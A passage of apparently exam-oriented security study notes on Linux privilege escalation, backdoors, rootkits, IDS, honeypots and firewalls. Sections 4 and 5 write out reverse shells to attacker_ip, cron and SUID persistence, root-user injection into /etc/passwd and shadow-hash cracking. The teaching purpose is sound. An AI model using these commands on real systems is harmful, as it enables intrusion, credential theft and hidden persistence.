to write to read-only memory mappings — could overwrite
`/etc/passwd` to add a root user. Affected all Linux kernels
2.6.22–4.8.3. Patched October 2016.

**Sudo misconfiguration:**

    Check sudo permissions:
    sudo -l

    If output shows:
    (root) NOPASSWD: /usr/bin/vim

    Exploit:
    sudo vim -c ':!/bin/bash'
    → vim opens as root → escape to shell → root shell obtained

    Common exploitable sudo entries:
    /usr/bin/vim, /usr/bin/python, /usr/bin/perl,
    /usr/bin/find, /usr/bin/awk, /usr/bin/tee

**GTFOBins** (gtfobins.github.io):
Comprehensive list of Unix binaries that can be exploited
for privilege escalation via sudo, SUID, or other misconfigs.

---

### 4.3 SUID and SGID Exploitation

**WHAT:**
The SUID (Set User ID) bit causes an executable to run with
the privileges of the **file owner** (often root) rather than
the executing user. SGID (Set Group ID) does the same for
the file's group.

**Legitimate uses:** `passwd` (root-owned SUID — allows users
to change their own password), `ping` (root SUID — raw socket).

**Malicious SUID exploitation:**

    Find all SUID binaries:
    find / -perm -u=s -type f 2>/dev/null

    Common dangerous SUID finds:
    /usr/bin/vim    → SUID vim: sudo vim -c ':!/bin/bash'
    /usr/bin/python → SUID python: python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    /usr/bin/bash   → SUID bash: bash -p (runs as root)
    /usr/bin/find   → SUID find: find . -exec /bin/bash -p \; -quit
    /bin/cp         → SUID cp: copy malicious /etc/passwd (add root user)

**SUID shell escalation (bash example):**

    Check: ls -la /bin/bash
    If:    -rwsr-xr-x 1 root root /bin/bash   ← SUID set
    Run:   /bin/bash -p
    Result: bash# (root shell — -p preserves SUID privileges)

**Creating SUID shell (post-compromise persistence):**

    (As root, after compromise)
    cp /bin/bash /tmp/.hidden_shell
    chmod u+s /tmp/.hidden_shell
    → Any user can now run: /tmp/.hidden_shell -p → root shell
    → Persists across login sessions

---

### 4.4 Cron Job Exploitation

**WHAT:**
Cron runs scheduled tasks — many organizations have scripts
scheduled as root for backups, maintenance, and monitoring.
If these scripts have insecure permissions, an attacker can
modify them to execute arbitrary commands as root.

**Attack scenario:**

    Find cron jobs:
    cat /etc/crontab
    ls -la /etc/cron.* /var/spool/cron/

    Example vulnerable cron entry:
    */5 * * * * root /opt/scripts/backup.sh

    Check permissions:
    ls -la /opt/scripts/backup.sh
    -rwxrwxrwx 1 root root /opt/scripts/backup.sh  ← world-writable!

    Exploit — append reverse shell to backup.sh:
    echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /opt/scripts/backup.sh

    Wait up to 5 minutes → cron runs backup.sh as root
    → Reverse shell connects to attacker with root privileges

**PATH exploitation in cron:**

    Cron script calls: cleanup (without full path)
    PATH variable in crontab: PATH=/tmp:/usr/local/bin:/usr/bin

    Attacker creates /tmp/cleanup:
    #!/bin/bash
    bash -i >& /dev/tcp/attacker/4444 0>&1

    chmod +x /tmp/cleanup
    → Next cron run: finds /tmp/cleanup first → executes as root

---

### 4.5 Linux Password File Attacks

**File locations:**

    /etc/passwd  — readable by all users
    /etc/shadow  — readable by root only

**Viewing password hashes:**

    cat /etc/shadow
    root:$6$salt$hash:18000:0:99999:7:::
    john:$6$salt$hash:18000:0:99999:7:::

**Hash algorithms in /etc/shadow:**

| Prefix | Algorithm | Status |
|---|---|---|
| `$1$` | MD5 | Broken — do not use |
| `$2a$` | bcrypt | Strong — used in some distros |
| `$5$` | SHA-256 | Acceptable |
| `$6$` | SHA-512 | Current Linux standard |
| `$y$` | yescrypt | Modern — Debian/Ubuntu |

**Cracking /etc/shadow hashes:**

    John the Ripper:
    unshadow /etc/passwd /etc/shadow > combined.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
    john --show combined.txt

    Hashcat (SHA-512 = mode 1800):
    hashcat -m 1800 shadow_hashes.txt rockyou.txt

**Adding a root user (if /etc/passwd is writable):**

    Generate password hash:
    openssl passwd -6 -salt xyz newpassword
    → $6$xyz$hashedvalue

    Append to /etc/passwd:
    echo 'hacker:$6$xyz$hashedvalue:0:0:root:/root:/bin/bash' >> /etc/passwd

    Login as hacker with newpassword → root access

---

### 4.6 Linux Network Attacks

**Port and service enumeration from inside Linux:**

    netstat -tulpn          ← listening ports + owning processes
    ss -tulpn               ← modern replacement for netstat
    ps aux                  ← all running processes
    cat /etc/hosts          ← local name resolution
    ip route show           ← routing table — identify network segments
    arp -a                  ← ARP cache — neighboring hosts

**Pivot via SSH tunneling:**

    Attacker has shell on compromised server (192.168.1.10)
    Internal network: 10.0.0.0/24 (not directly accessible to attacker)

    Local port forwarding:
    ssh -L 8080:10.0.0.5:80 user@192.168.1.10
    → Access 10.0.0.5:80 via localhost:8080

    Dynamic SOCKS proxy:
    ssh -D 1080 user@192.168.1.10
    → Route all traffic through SOCKS proxy → reach 10.0.0.0/24

**Persistence via authorized_keys:**

    Attacker generates SSH key pair:
    ssh-keygen -t rsa -b 4096

    Appends public key to victim:
    echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys

    Attacker connects passwordlessly forever:
    ssh -i attacker_private_key root@victim_ip

---

### 4.7 Linux Enumeration Commands

Critical commands run during post-exploitation enumeration:

    # System info
    uname -a                 ← kernel version → check for local exploits
    cat /etc/os-release      ← distribution and version
    hostname                 ← machine name
    id                       ← current user, uid, groups
    whoami                   ← current username

    # Users and groups
    cat /etc/passwd          ← all users
    cat /etc/group           ← all groups
    cat /etc/sudoers         ← sudo permissions (if readable)
    sudo -l                  ← what current user can sudo

    # Network
    ifconfig / ip addr       ← network interfaces and IPs
    netstat -tulpn           ← open ports and services
    route -n / ip route      ← routing tables
    cat /etc/resolv.conf     ← DNS servers

    # Files of interest
    find / -perm -u=s 2>/dev/null    ← SUID files
    find / -writable -type f 2>/dev/null  ← world-writable files
    find / -name "*.conf" 2>/dev/null     ← config files
    cat ~/.bash_history      ← command history — passwords often here!
    env                      ← environment variables — tokens, paths

    # Cron
    crontab -l               ← current user's cron
    cat /etc/crontab         ← system cron

---

## Section 5 — Linux Backdoors

### 5.1 What Is a Linux Backdoor

**WHAT:**
A Linux backdoor is a means of **maintaining persistent covert
access** to a compromised Linux system — surviving reboots,
password changes, and basic security remediation — allowing
the attacker to return without repeating the initial exploit.

**Persistence mechanisms timeline:**

    Initial exploit → root access
            ↓
    Attacker installs persistence:
    Multiple backdoors for redundancy
    Some stealthy, some more obvious
            ↓
    Defender discovers primary compromise → remediates
            ↓
    Attacker returns via secondary backdoor
    → Reinstalls primary access

---

### 5.2 Types of Linux Backdoors

| Type | Mechanism | Stealthiness | Survives Remediation? |
|---|---|---|---|
| **SSH authorized_keys** | Attacker's public key added | Low (visible in authorized_keys) | Yes — if key not removed |
| **Cron backdoor** | Cron job executes reverse shell periodically | Medium | Yes — until cron entry removed |
| **SUID shell** | Hidden SUID bash copy | Medium | Until discovered and removed |
| **Trojanized system binaries** | Replace ls, ps, netstat with modified versions hiding attacker | High | Until hash verified |
| **Netcat listener** | nc -lvp listening for connections | Low — port visible | No — not persistent |
| **Netcat reverse shell cron** | Cron periodically calls nc reverse shell | Medium | Yes |
| **Kernel rootkit (LKM)** | Loadable kernel module hides processes/files | Very high | Yes — persists until module removed |
| **LD_PRELOAD rootkit** | Malicious library intercepts system calls | High | Yes |
| **PAM backdoor** | Modified PAM library accepts master password | Very high | Yes |
| **Init/systemd service** | Backdoor installed as system service | Medium | Yes — survives reboot |

---

### 5.3 Netcat Backdoor

**WHAT:**
Netcat (`nc`) is a legitimate network utility capable of reading
and writing data across network connections using TCP/UDP.
Attackers use it for simple backdoors because it is often
already installed on Linux systems.

**Bind shell (attacker connects to victim):**

    On victim (listening):
    nc -lvp 4444 -e /bin/bash
    -l = listen mode
    -v = verbose
    -p 4444 = port 4444
    -e /bin/bash = execute bash for each connection

    On attacker (connecting):
    nc victim_ip 4444
    → Now has a bash shell on victim

    Problem: victim must have incoming port 4444 open through firewall

**Reverse shell (victim connects to attacker — bypasses firewall):**

    On attacker (listening):
    nc -lvp 4444

    On victim (connects out — bypasses ingress firewall):
    nc attacker_ip 4444 -e /bin/bash
    → Victim initiates outbound connection — bypasses most firewalls
    → Attacker receives shell

**Bash reverse shell (no nc -e required):**

    bash -i >& /dev/tcp/attacker_ip/4444 0>&1
    → Uses bash's built-in /dev/tcp to create TCP connection
    → stdin/stdout/stderr redirected to attacker's nc listener

**Persistent netcat via cron:**

    echo "*/5 * * * * root bash -i >& /dev/tcp/attacker_ip/4444 0>&1" \
    >> /etc/crontab

    → Every 5 minutes: victim connects to attacker → root shell

---

### 5.4 SSH Backdoors

**Method 1 — Authorized keys:**

    ssh-keygen -t ed25519 -f /tmp/backdoor_key
    mkdir -p /root/.ssh
    cat /tmp/backdoor_key.pub >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys

    Attacker connects: ssh -i /tmp/backdoor_key root@victim

**Method 2 — SSH on non-standard port:**

    Edit /etc/ssh/sshd_config:
    Port 8443      ← non-standard port

    Restart sshd:
    systemctl restart sshd

    Attacker connects on port 8443 — less likely to be noticed

**Method 3 — PAM SSH backdoor:**
Modify the PAM SSH configuration to accept a hardcoded
"master password" that works for any user — regardless of
their actual password. Extremely stealthy — no file changes
visible in normal directory listing.

**Method 4 — Trojanized sshd binary:**
Replace the system sshd binary with a modified version that:
- Accepts all connections from a specific attacker key
- Logs credentials of all legitimate users who connect
- Maintains all normal SSH functionality (no disruption noticed)

---

### 5.5 Rootkits on Linux

**WHAT:**
A rootkit on Linux modifies the operating system at a level
that **hides the attacker's presence** — hiding processes,
files, network connections, kernel modules, and users from
standard system administration tools.

**User-space rootkits:**
Replace standard system commands with trojanized versions:

    Commands typically replaced:
    ls      → hides attacker's files (no output for directories with "MAGIC_STRING")
    ps      → hides attacker's processes by PID or name
    netstat → hides attacker's listening ports
    top     → hides attacker's CPU/memory usage
    find    → skips attacker's directories
    who     → hides attacker's login sessions

    Detection: compare binary hashes against known-good versions
    rpm -Va (RPM-based)
    debsums (Debian-based)

**LD_PRELOAD rootkit:**

    Create malicious shared library (evil.so) that intercepts
    readdir(), open(), stat() system calls
    → Returns results with attacker's files/processes filtered out

    Install:
    echo "/path/to/evil.so" >> /etc/ld.so.preload
    → Every process on system loads evil.so first
    → All system call outputs filtered

    Detection: check /etc/ld.so.preload for unauthorized entries

---

### 5.6 Kernel-Level Rootkits

**WHAT:**
Kernel rootkits operate as Loadable Kernel Modules (LKM) —
running at the same privilege level as the OS kernel itself.
They modify kernel data structures and system call tables
to hide the attacker's presence at the deepest possible level.

**How LKM rootkits work:**

    Normal system call:
    User calls getdents() (list directory)
    → Kernel executes getdents() → returns directory entries

    After LKM rootkit installed:
    rootkit replaces sys_call_table[__NR_getdents] with evil_getdents()
    User calls getdents()
    → evil_getdents() called → calls original → removes rootkit files from results
    → Returns filtered list → attacker's files invisible

**Famous Linux rootkits:**

| Rootkit | Year | Type | Notable Feature |
|---|---|---|---|
| **Adore-ng** | 2004 | LKM | Hides files, processes, network connections |
| **Reptile** | 2018 | LKM | Open-source — GitHub hosted — widely used |
| **Diamorphine** | 2014 | LKM | Sends SIGKILL signal to make processes invisible |
| **Azazel** | 2013 | LD_PRELOAD | User-space — no kernel modification needed |
| **Necurs** | 2011 | LKM | Used in large botnet operations |

**Kernel rootkit installation:**

    insmod rootkit.ko       ← install LKM rootkit
    rmmod rootkit.ko        ← uninstall (attacker cleanup)

    Hide the module itself:
    list_del_init(&THIS_MODULE->list);
    → Module no longer appears in lsmod output

---

### 5.7 Linux Backdoor Detection

| Detection Method | What It Finds |
|---|---|
| **Binary hash verification** | `rpm -Va` / `debsums` — modified system binaries (trojanized ls, ps) |
| **chkrootkit** | Scans for known rootkit signatures in binaries and kernel |
| **rkhunter** | Rootkit hunter — checks file hashes, SUID files, hidden processes |
| **Lynis** | Comprehensive Linux security auditing tool |
| **Process list discrepancy** | Compare `ps aux` output with `/proc` directory listing — rootkits hide from ps but /proc exists |
| **netstat vs ss vs /proc/net/tcp** | Cross-reference — rootkits may hide from netstat but /proc shows all |
| **lsmod / /proc/modules** | Loaded kernel modules — hidden modules visible in /proc/modules |
| **File integrity monitoring (AIDE)** | Baseline all system files — detect modifications |
| **Booting from clean media** | Rootkits not active — system files visible as they are |
| **Memory forensics (Volatility)** | Analyze RAM dump — find hidden processes and modules |

**rkhunter usage:**

    rkhunter --check --sk      ← check all — skip key press
    rkhunter --update           ← update signature database
    rkhunter --propupdate       ← update file property database

---

## Section 6 — Intrusion Detection Systems (IDS)

### 6.1 What Is an IDS

**WHAT:**
An Intrusion Detection System (IDS) is a security tool that
**monitors network traffic or host activity** for signs of
malicious activity, policy violations, or security threats —
and generates alerts for security analysts to investigate.

**Critical distinction — IDS vs IPS:**

    IDS (Intrusion Detection System):
    → Monitors traffic PASSIVELY (out-of-band / tap)
    → DETECTS threats → generates ALERTS
    → Does NOT block traffic
    → Analyst investigates and takes action

    IPS (Intrusion Prevention System):
    → Monitors traffic INLINE (in-band)
    → DETECTS threats → BLOCKS/DROPS malicious traffic automatically
    → Traffic must pass through IPS
    → Active prevention — no human needed per incident

> [!IMPORTANT]
> **IDS = detect and alert only. IPS = detect and block.**
> This is the most commonly tested IDS/IPS distinction.
> An IDS that is reconfigured to block traffic is functioning
> as an IPS.

**What IDS monitors:**

| Target | Examples |
|---|---|
| Network traffic | Packet headers, payload content, connection patterns |
| Host activity | File system changes, process creation, registry modifications |
| Log files | System logs, application logs, authentication logs |
| System calls | Kernel-level activity monitoring |

---

### 6.2 IDS Types — NIDS vs HIDS

**NIDS (Network-based IDS):**
Monitors network traffic at a **strategic network point** —
typically using a network tap or switch SPAN port to copy
all traffic for analysis.

    NIDS placement:
    Internet → Firewall → [NIDS tap here] → Internal network
    OR
    Internal segment → [NIDS SPAN port] → monitors segment traffic

**Pros:** Single sensor monitors all hosts on segment.
**Cons:** Cannot monitor encrypted traffic (unless SSL inspection
added), cannot detect host-level activity, may miss attacks
in high-speed links.

**HIDS (Host-based IDS):**
Installed on **individual endpoints** — monitors local file
system, processes, system calls, logs, and configuration changes.

    HIDS agent installed on server:
    Monitors: /etc/passwd, /etc/shadow, /etc/crontab
    Monitors: All running processes
    Monitors: Network connections from this host
    Monitors: System call behaviour of running applications
    Alerts: Any change to monitored files → alert generated

**Pros:** Monitors encrypted traffic (at host level), detects
insider threats, OS-level visibility.
**Cons:** Requires agent on every host, agent can be disabled
by rootkit, scalability challenges.

| Property | NIDS | HIDS |
|---|---|---|
| **Location** | Network segment tap/SPAN | On each monitored host |
| **Monitors** | Network traffic flows | Host files, processes, syscalls |
| **Encrypted traffic** | ❌ Blind (without SSL inspection) | ✅ Yes — post-decryption |
| **Insider threat** | Limited | ✅ Strong |
| **Coverage** | All hosts on segment — one sensor | One sensor per host |
| **Agent required** | ❌ No | ✅ Yes |
| **Example tools** | Snort, Suricata, Zeek | OSSEC, Wazuh, Tripwire, AIDE |

---

### 6.3 IDS Detection Methods

**Signature-Based Detection (Misuse Detection):**

    Maintains database of known attack signatures
    (byte patterns, protocol anomalies, rule-based matching)
    Compares network packets or host events against signature DB
    Match found → ALERT

    Pros: Low false positives, fast, precise for known attacks
    Cons: Blind to zero-day attacks, new malware, novel techniques
    Requires: Frequent signature updates

**Anomaly-Based Detection (Behaviour Detection):**

    Phase 1 (Training): Establish baseline of normal behaviour
    - Normal traffic volume, protocols, connection patterns
    - Normal user login times, typical commands
    - Normal file access patterns

    Phase 2 (Detection): Compare current activity to baseline
    - Significant deviation from baseline → ALERT
    - New protocol seen, unusual traffic spike, login at 3AM

    Pros: Can detect zero-day attacks and unknown threats
    Cons: Higher false positive rate — legitimate but unusual
          activity triggers alerts (software updates, backups)
    Requires: Extensive training period

**Stateful Protocol Analysis:**
Compares observed protocol behaviour against RFC-defined
expected behaviour. HTTP request that violates RFC → alert.
Detects protocol-level attacks even without specific signatures.

**Detection method comparison:**

| Property | Signature-Based | Anomaly-Based |
|---|---|---|
| Zero-day detection | ❌ No | ✅ Yes |
| False positive rate | Low | Higher |
| Known attack detection | ✅ Excellent | ✅ Yes |
| Update requirement | Frequent signatures | Baseline retraining |
| Computational cost | Low | Higher |

---

### 6.4 IDS Evasion Techniques

Attackers use these techniques to avoid triggering IDS alerts:

| Technique | How It Works |
|---|---|
| **Fragmentation** | Split attack payload across many small IP fragments — reassembly reveals attack |
| **Protocol ambiguity** | Exploit differences in how IDS and target interpret overlapping fragments |
| **Encryption** | Encrypt attack traffic (HTTPS, custom encryption) — IDS cannot read encrypted payload |
| **Obfuscation** | Encode attack strings (URL encoding, Base64, Unicode) — signature doesn't match |
| **Flooding** | Overwhelm IDS with massive traffic — alert queue fills — real attacks missed |
| **Timing attacks** | Send attack very slowly over many minutes/hours — below rate thresholds |
| **Session splicing** | Split attack across many TCP segments — IDS may not reassemble all segments |
| **TTL manipulation** | Set TTL so packet expires at IDS but reaches target |
| **Polymorphic shellcode** | Mutate shellcode byte pattern each attempt — no stable signature |
| **Mimicking legitimate traffic** | Make attack traffic look like normal HTTP/DNS/etc |

---

### 6.5 Snort — The Reference NIDS

**WHAT:**
Snort is the world's most widely deployed open-source network
intrusion detection/prevention system — developed by Martin Roesch
in 1998 and now maintained by Cisco (acquired Sourcefire in 2013).

**Snort operating modes:**

| Mode | Function |
|---|---|
| **Sniffer mode** | Reads packets from network — displays on console |
| **Packet logger mode** | Reads packets — saves to disk for later analysis |
| **NIDS mode** | Reads packets — matches against rules — generates alerts |

**Snort rule structure:**

    action proto src_ip src_port direction dst_ip dst_port (options)

    Example rule — detect ICMP ping:
    alert icmp any any -> any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

    Example rule — detect SQL injection attempt:
    alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS \
    (msg:"SQL Injection Attempt"; content:"UNION SELECT"; nocase; \
    pcre:"/UNION\s+SELECT/i"; sid:1000002; rev:1;)

**Snort rule options:**

| Option | Meaning |
|---|---|
| `msg` | Alert message text |
| `content` | Match specific byte pattern in packet payload |
| `nocase` | Case-insensitive content matching |
| `pcre` | Perl-Compatible Regular Expression matching |
| `sid` | Snort rule ID — must be unique |
| `rev` | Rule revision number |
| `classtype` | Attack classification |
| `threshold` | Suppress repeated alerts |
| `flags` | TCP flag matching (S=SYN, A=ACK, R=RST) |

**Snort commands:**

    Sniffer mode:
    snort -v -i eth0

    NIDS mode with rules:
    snort -A console -i eth0 -c /etc/snort/snort.conf

    Test configuration:
    snort -T -c /etc/snort/snort.conf

**Suricata:**
Modern alternative to Snort — multi-threaded (Snort is
single-threaded), uses Snort-compatible rule format, adds
Lua scripting support, and includes built-in protocol
detection. Increasingly preferred for high-speed networks.

---

## Section 7 — Honeypots

### 7.1 What Is a Honeypot

**WHAT:**
A honeypot is a **decoy system, service, or resource** deliberately
deployed to attract attackers — appearing to be a legitimate,
valuable target — while all activity is monitored and logged
in detail for intelligence gathering, early warning, and research.

**WHY honeypots are deployed:**

| Purpose | Detail |
|---|---|
| **Early warning** | Honeypots have no legitimate traffic — any connection is suspicious |
| **Intelligence gathering** | Study attacker techniques, tools, and objectives in a safe environment |
| **Detection of insider threats** | Internal honeypots catch lateral movement attempts |
| **Delaying attackers** | Time spent on honeypot = time not attacking real systems |
| **Research** | Capture zero-day exploits, new malware samples |
| **Legal evidence** | Log everything an attacker does — preserves forensic evidence |

**Analogy:**
A honeypot is like a dye-pack in a bank teller's cash drawer.
The dye-pack looks like real money — it is placed specifically
to be taken by a thief — when taken, it marks the thief with
indelible dye (logs their activities). Any legitimate bank employee
knows not to take that specific bundle — only thieves do.

---

### 7.2 Types of Honeypots

**By Interaction Level:**

| Type | Description | Risk | Intelligence Value |
|---|---|---|---|
| **Low-interaction** | Simulates a few services — does not run a real OS | Low | Limited — only captures basic probes |
| **Medium-interaction** | More services simulated — some real OS calls | Medium | Better — captures more attack patterns |
| **High-interaction** | Real operating system and services — fully functional target | High — attacker has real system | Highest — captures complete attack chain |
| **Pure honeypot** | Completely real production-like system | Very High | Maximum — full zero-day capture |

**By Purpose:**

| Type | Purpose |
|---|---|
| **Production honeypot** | Inside production network — early warning for internal threats |
| **Research honeypot** | Isolated — capture malware and attack techniques |
| **Honeytrap** | Single fake service — SSH, database, web application |
| **Honeyweb** | Fake web application with realistic-looking data |
| **Honeynet** | Network of multiple honeypots simulating full infrastructure |

---

### 7.3 Honeypot Deployment Strategies

**Inside network (production honeypot):**

    Internet → Firewall → [DMZ — Real servers + Honeypot server]
                                                         ↑
                              Any connection to honeypot = immediate alert
                              (no legitimate user or process should touch it)

    Internal honeypots:
    Fake file share: \\server\payroll-data (only accessible internally)
    Fake database: mysql://10.0.0.50:3306 (appears to contain sensitive data)
    Any access → insider threat or lateral movement → immediate detection

**Honeynet:**

    Multiple honeypots networked together
    Simulates: web server, database, file server, workstations
    Realistic internal network structure
    All traffic between honeypot systems monitored
    Attackers believe they are navigating a real network

**Canary tokens (deception technology):**
Modern lightweight honeypot concept — fake credentials,
documents, email addresses, DNS names embedded in real
infrastructure. When an attacker uses a canary token
(opens a document, uses fake credentials) — an alert fires.
No maintenance required — purely passive.

---

### 7.4 Honeypot Tools

| Tool | Type | Platform | Notes |
|---|---|---|---|
| **Honeyd** | Low-interaction NIDS honeypot | Linux | Simulates many IP addresses and services |
| **Kippo / Cowrie** | SSH honeypot | Linux | Captures SSH brute force + commands |
| **Glastopf** | Web application honeypot | Linux | Captures SQL injection, LFI, XSS attempts |
| **Dionaea** | Malware capture honeypot | Linux | Simulates SMB, HTTP, FTP — captures malware |
| **Conpot** | ICS/SCADA honeypot | Linux | Simulates industrial control systems |
| **T-Pot** | All-in-one honeynet platform | Linux | Docker-based — 20+ honeypots combined |
| **OpenCanary** | Distributed honeypot | Cross-platform | Lightweight canary services |
| **Thinkst Canary** | Commercial canary tokens | Cloud | Enterprise deception platform |

---

### 7.5 Legal Considerations of Honeypots

**Is it legal to run a honeypot in India?**

    Generally: YES — deploying a honeypot on your own infrastructure
    is legal. You are monitoring your own systems and attracting
    attacks to a controlled decoy.

**Legal considerations:**

| Issue | Detail |
|---|---|
| **Entrapment** | Honeypots do not entrap — entrapment requires law enforcement inducing someone to commit a crime they would not otherwise commit. A honeypot merely presents an opportunity — the attacker initiates. |
| **Evidence admissibility** | Honeypot logs can be used as evidence if properly maintained (chain of custody, timestamped, unmodified). |
| **Counter-attacking from honeypot** | Using a honeypot to launch attacks against the attacker is illegal — vigilante hacking. |
| **Privacy laws** | In some jurisdictions, capturing personally identifiable information from attackers may require disclosure. |
| **ISP notification** | Using a honeypot to identify attackers may require law enforcement involvement — do not attempt to identify/contact attackers directly. |
| **IT Act 2000 (India)** | S.43 — you are authorized to monitor your own systems. Honeypots on your infrastructure are legal. |

---

## Section 8 — Firewalls

### 8.1 What Is a Firewall

**WHAT:**
A firewall is a **network security device or software** that
monitors and controls incoming and outgoing network traffic
based on predetermined security rules — establishing a barrier
between trusted internal networks and untrusted external networks.

**What firewalls control:**
- Which IP addresses can communicate with which (IP filtering)
- Which ports and protocols are allowed (port/protocol filtering)
- Which connections are valid based on state (stateful inspection)
- What application data is permitted (application inspection)
- Which users are allowed to access which resources (NGFW)

**What firewalls do NOT do:**
- Detect malicious content within permitted traffic (that is IDS/IPS)
- Prevent insider threats (traffic originates internally)
- Encrypt traffic (that is VPN/TLS)
- Filter encrypted traffic content (without SSL inspection)

---

### 8.2 Types of Firewalls

**Packet Filtering Firewall (Generation 1):**
Inspects individual packets at Layer 3/4 — source/destination IP,
source/destination port, protocol. No awareness of connection state.

    Rule example:
    ALLOW TCP 192.168.1.0/24 → ANY 80,443
    DENY ALL

    Limitation: Cannot distinguish valid TCP packets from forged/out-of-sequence
    Stateless — each packet evaluated independently
    Vulnerable to: IP spoofing, fragmentation attacks

**Stateful Inspection Firewall (Generation 2):**
Tracks the STATE of TCP/UDP connections — knows which packets
are part of established connections.

    Connection state table:
    SRC IP:PORT      DST IP:PORT     STATE
    192.168.1.10:52341  8.8.8.8:443   ESTABLISHED
    192.168.1.10:52342  10.0.0.5:22   SYN_SENT

    Only established connections are forwarded
    Unsolicited inbound traffic dropped (no matching state)
    Closes state entries after timeout/FIN/RST

**Application-Layer Firewall (Proxy Firewall — Generation 3):**
Terminates connections and re-originates them — full Layer 7
inspection. The firewall is the actual communication endpoint.

    Client → Firewall (proxy) → Server
    Firewall fully parses HTTP request → makes decision → forwards

    Can: inspect URLs, HTTP methods, content
    Can: block specific commands (FTP DELETE, HTTP PUT)
    Cannot: handle all protocols without a specific proxy module

**Next-Generation Firewall (NGFW):**
Combines stateful inspection with:
- Deep packet inspection (DPI) at all layers
- Application identification regardless of port
- User identity integration (LDAP/Active Directory)
- SSL/TLS inspection (decrypt → inspect → re-encrypt)
- Integrated IPS capability
- Threat intelligence feeds
- Malware sandboxing

| Firewall Type | Layer | State Tracking | App Aware | User Identity |
|---|---|---|---|---|
| Packet filter | L3/L4 | ❌ | ❌ | ❌ |
| Stateful | L3/L4 | ✅ | ❌ | ❌ |
| Application proxy | L7 | ✅ | ✅ Partial | ❌ |
| NGFW | L3–L7 | ✅ | ✅ Full | ✅ |

---

### 8.3 Firewall Architectures

**Bastion Host:**
A single, hardened computer that sits between the internet
and the internal network — the only publicly accessible machine.
All inbound internet traffic goes through it.

    Internet → Bastion Host → Internal Network

    Bastion host: minimal services, heavily audited, no unnecessary software
    All logs monitored intensely — first line of defence

**Screened Subnet (DMZ — De-Militarized Zone):**
A network segment between two firewalls — public-facing servers
(web, email, DNS) placed in the DMZ — accessible from internet
but isolated from internal network.

    Internet → [Outer Firewall] → DMZ (Web/Mail/DNS servers)
                                → [Inner Firewall] → Internal Network

    If web server in DMZ is compromised:
    → Attacker is in DMZ
    → Inner firewall prevents access to internal network
    → Internal data protected even after DMZ breach

    This is the standard enterprise architecture — see Extra Notes E5.

**Dual-Homed Host:**
A computer with two NICs — one connected to internet, one
to internal network — acting as a gateway. IP forwarding
disabled — traffic must pass through the host's application layer.

    Internet ← NIC1 | DUAL-HOMED HOST | NIC2 → Internal Network

    No direct IP forwarding — all traffic proxied through host applications

---

### 8.4 Firewall Evasion Techniques

| Technique | How It Evades Firewall |
|---|---|
| **Port tunneling** | Tunnel attack traffic through allowed port (HTTP/80, HTTPS/443) |
| **Protocol tunneling** | Encode attack data inside allowed protocol (DNS tunneling, ICMP tunneling) |
| **Fragmentation** | Fragment attack packets — firewall may not reassemble — passes fragments |
| **Source port manipulation** | Use allowed source port (53, 80) — firewall rules based on source port only |
| **IP spoofing** | Forge source IP of trusted host — packet filter allows based on source IP |
| **Encrypted channels** | HTTPS, SSH tunneling — firewall cannot inspect encrypted content |
| **Application layer bypass** | Use allowed application to carry malicious data (HTTP POST body) |
| **Covert channels** | Use unusual protocol fields (ICMP payload, TCP initial sequence number) |
| **VPN/SSH tunneling** | Tunnel all traffic through authorized VPN — firewall sees only VPN |
| **Firewalking** | Probe firewall rules using TTL manipulation — map allowed ports remotely |

**Firewalking:**
Send packets with increasing TTL values — if packet passes through
firewall → router behind decrements TTL to 0 → sends ICMP TTL
Exceeded back to attacker → attacker knows that port is permitted.
Tool: `firewalk`

---

### 8.5 Firewall Countermeasures and Best Practices

| Best Practice | Detail |
|---|---|
| **Default deny** | Block all traffic by default — explicitly allow only what is needed |
| **Least privilege** | Allow minimum necessary ports/protocols per service |
| **Egress filtering** | Filter outbound traffic — prevent data exfiltration, C2 callbacks |
| **SSL/TLS inspection** | Decrypt HTTPS for inspection — re-encrypt before forwarding |
| **Regular rule audits** | Remove stale/unused rules — accumulated rules create vulnerabilities |
| **Log all denied traffic** | Every blocked connection is potential threat intelligence |
| **Separate management interface** | Manage firewall via dedicated out-of-band interface — not data plane |
| **Firmware updates** | Firewall firmware vulnerabilities are actively exploited |
| **HA (High Availability) pairs** | Redundant firewalls — failover prevents single point of failure |
| **Integrate with threat intel** | Block known malicious IPs/domains via threat intelligence feeds |
| **DMZ for public services** | All internet-facing servers in DMZ — separate from internal network |

---

## 📌 Extra Notes

### E1 — IDS vs IPS vs Firewall — Full Comparison

> [!NOTE]
> This three-way comparison is one of the most commonly MCQ-tested
> topics in this session — know every property precisely.

| Property | Firewall | IDS | IPS |
|---|---|---|---|
| **Primary function** | CONTROL traffic flow | DETECT malicious activity | DETECT + BLOCK malicious activity |
| **Traffic handling** | Allows/denies based on rules | Passively monitors (out-of-band) | Inline — must pass through |
| **Blocks attacks?** | ✅ Based on rules (port/IP) | ❌ Alerts only | ✅ Actively blocks/drops |
| **Detects attacks in permitted traffic?** | ❌ | ✅ | ✅ |
| **False positive risk** | Low (rule-based) | Medium-High | High concern — blocks legitimate |
| **Network position** | Inline — traffic through it | Out-of-band — SPAN/tap | Inline — traffic through it |
| **Encrypted traffic** | Blind (without inspection) | Blind (without inspection) | Blind (without inspection) |
| **Zero-day detection** | ❌ (if no rule) | Anomaly-based: ✅ | Anomaly-based: ✅ |
| **Response to threat** | Block (if rule exists) | Generate alert | Block automatically |
| **Examples** | iptables, pfSense, Palo Alto | Snort (IDS mode), Zeek, OSSEC | Snort (IPS mode), Suricata, Cisco Firepower |

> [!IMPORTANT]
> **Snort can function as BOTH IDS and IPS** depending on configuration:
> - IDS mode: reads from a tap/SPAN port → alerts only
> - IPS mode (inline): inserted in traffic path → can drop packets
>
> This is a common MCQ scenario: "Snort is configured inline with
> drop rules — is it functioning as IDS or IPS?" → **IPS**.

---

### E2 — Snort Rule Syntax Deep Dive

> [!NOTE]
> Snort rule syntax is directly referenced in the syllabus Lab
> section and likely MCQ-tested.

**Rule header format:**

    action  protocol  src_ip  src_port  direction  dst_ip  dst_port

**Actions:**

| Action | Behaviour |
|---|---|
| `alert` | Generate alert + log packet |
| `log` | Log packet only — no alert |
| `pass` | Ignore packet (whitelist) |
| `drop` | Drop packet + alert (IPS mode) |
